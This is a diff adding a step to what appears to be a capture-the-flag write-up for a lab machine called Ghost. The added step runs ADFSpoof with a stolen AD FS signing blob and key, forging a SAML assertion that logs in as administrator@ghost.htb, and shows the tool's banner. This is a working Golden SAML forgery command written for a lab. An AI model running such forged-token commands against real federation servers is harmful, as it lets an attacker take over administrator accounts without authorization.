@@ -991,3 +991,25 @@ The blob just needs base64 decoding then placining into a file
 
 Now everything is setup i can run ADFSpoof
 
+```python
+python ./ADFSpoof.py \
+       --blob ../enc_blob.bin ../privkey2.bin \
+       --server federation.ghost.htb saml2 \
+       --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse \
+       --rpidentifier https://core.ghost.htb:8443 \
+       --assertion '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>' \
+       --nameidformat "urn:oasis:names:tc:SAML:2.0:assertion" \
+       --nameid administrator@ghost.htb
+ 
+    ___    ____  ___________                   ____
+   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
+  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
+ / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
+/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
+                        /_/                        
+ 
+A tool to for AD FS security tokens
+Created by @doughsec
+
+
+```
